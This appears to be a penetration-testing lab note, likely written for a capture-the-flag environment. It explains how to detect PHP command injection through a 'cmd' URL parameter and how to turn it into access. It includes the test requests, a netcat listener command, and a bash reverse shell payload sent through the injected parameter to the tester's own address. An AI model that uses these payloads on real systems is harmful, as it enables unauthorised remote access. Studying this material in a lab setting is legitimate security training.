# Code Injection RCE

## Detecting RCE

PHP running on the site?

* Attempt RCE to see if PHP exec () or PHP passthru is being used to pass commands to the local system
* <mark style="color:yellow;">Simply add ?cmd=(command-here)</mark>
* <mark style="color:yellow;">This is even easier when you send the request to repeater and modify the request there</mark>

```
http://admin.holo.live/dashboard.php?cmd=id
```

Example Burp Request:

```
GET /dashboard.php?cmd=id HTTP/1.1
```

* Now, within the Response tab, utilize the search function for user data if necessary

## Exploitation

* Now that we confirmed that we have RCE, it is time to get a foothold on the target
* We need to make a reverse shell

{% embed url="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjihNiUi6T6AhXxhYkEHQgKDvUQFnoECAQQAQ&url=https%3A%2F%2Frevshells.com%2F&usg=AOvVaw2kSgZf8n__rsePim87CfRv" %}

* Attempt the bash reverse shell first

Initiate a Netcat listener:

```
nc -lnvp 1337
```

In the Repeater tab of Burp:

```
GET /dashboard.php?cmd=bash -c 'exec bash -i &>/dev/tcp/tun0-IP/1337 <&1'
```

* Highlight the reverse shell payload and do CTRL+U to URL encode
  * <mark style="color:yellow;">Since it is a GET request, you absolutely need to URL encode!</mark>
* Send the request and see if you get a shell
